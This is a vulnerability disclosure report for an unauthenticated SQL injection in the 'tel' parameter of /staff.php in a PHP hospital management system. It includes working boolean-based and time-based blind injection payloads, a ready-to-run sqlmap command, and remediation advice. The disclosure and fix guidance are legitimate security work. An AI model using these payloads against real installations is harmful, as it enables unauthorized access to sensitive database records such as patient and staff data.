# 1. Vulnerability Title

+ SQL Injection in Hospital Management System (PHP & MySQL) v1.0 – /staff.php

# 2. Affected Product
	Name: Hospital Management System (PHP & MySQL) with Source Code
	Version: 1.0

# 3. Vendor Information
	Homepage: CodeZips Hospital Management System
	Download Source Code: GitHub Repository

# 4. Reporting Details
	Submitter: nexus-wkx
	Vulnerable File: /staff.php

# 5. Vulnerability Details
	Type: SQL Injection

## 5.1 Root Cause

+ A SQL injection vulnerability exists in the /staff.php file of the Hospital Management System (PHP & MySQL) v1.0. The issue arises because the application directly incorporates user input from the tel parameter into SQL queries without proper sanitization or validation. This lack of input handling allows attackers to manipulate SQL queries by injecting malicious code.

## 5.2 Impact

### Exploiting this SQL injection vulnerability can lead to:
	Unauthorized access to the database
	Sensitive data leakage
	Data tampering or deletion
	Complete system control
	Service disruptions

**These impacts pose a significant threat to the security and operational continuity of the affected system.**

## 5.3 Description

+ During a security assessment of the “Hospital Management System (PHP & MySQL) with Source Code,” a critical SQL injection vulnerability was identified in the /staff.php file by nexus-wkx. The vulnerability stems from inadequate validation of the tel parameter, enabling attackers to inject malicious SQL statements. This flaw allows unauthorized database access, manipulation or deletion of data, and exposure of sensitive information. Immediate remediation is necessary to safeguard system integrity and data confidentiality.

# 6. Exploitation
+ No authentication or authorization is required to exploit this vulnerability.

# 7. Vulnerability Details and Proof of Concept (PoC)

## 7.1 Vulnerability Types
	Boolean-Based Blind SQL Injection
	Time-Based Blind SQL Injection

## 7.2 Vulnerable Parameter
	tel

## 7.3 Payloads

**Boolean-Based Blind SQL Injection:**
```bash
dmun=superAdmin&fname=polaris&lname=Blue&addr=1066 Front St&tel=178493927' RLIKE (SELECT (CASE WHEN (7754=7754) THEN 178493927 ELSE 0x28 END)) AND 'osvG'='osvG&email=hacker0x1@163.com&gender=Male&smbdd=2024-12-10&typesm=Doctor&workt=Evening&submit=SUBMIT
```
**Time-Based Blind SQL Injection:**
```bash
dmun=superAdmin&fname=polaris&lname=Blue&addr=1066 Front St&tel=178493927' AND (SELECT 1303 FROM (SELECT(SLEEP(5)))TqHy) AND 'fNVr'='fNVr&email=hacker0x1@163.com&gender=Male&smbdd=2024-12-10&typesm=Doctor&workt=Evening&submit=SUBMIT
```
## 7.4 Exploitation Steps with sqlmap
```bash
sqlmap -u "10.211.55.6:1133/staff.php" \
       --cookie="PHPSESSID=nn14c3dea64e57kvj0896m3djm" \
       --data="dmun=superAdmin&fname=polaris&lname=Blue&addr=1066+Front+St&tel=178493927&email=hacker0x1%40163.com&gender=Male&smbdd=2024-12-10&typesm=Doctor&workt=Evening&submit=SUBMIT" \
       --batch --level=5 --risk=3 --dbms=mysql \
       --random-agent --tamper=space2comment --dbs
```
**Screenshots from sqlmap Execution:**
+ <img width="1683" alt="image" src="https://github.com/user-attachments/assets/03b8f55f-790c-4097-9b53-219c84b5a969" />

# 8. Recommendations for Remediation
**1.Use Prepared Statements and Parameterized Queries:**
+ Implementing prepared statements ensures that SQL queries are separated from user inputs, preventing malicious code execution.
**2.Input Validation and Sanitization:**
+ Rigorously validate and sanitize all user inputs to conform to expected formats and types before processing.
**3.Least Privilege Principle:**
+ Restrict database user permissions to the minimum required, avoiding the use of high-privilege accounts (e.g., root or admin) for routine operations.
**4.Regular Security Audits:**
+ Conduct periodic code reviews and security assessments to identify and remediate vulnerabilities promptly.

**Appendix**
+ Vendor Homepage: [Hospital Management System](https://codezips.com/php/hospital-management-system-in-php-and-mysql-with-source-code/)
+ Download Source Code: [GitHub Repository](https://codeload.github.com/codezips/hospital-management-system-php/zip/master)
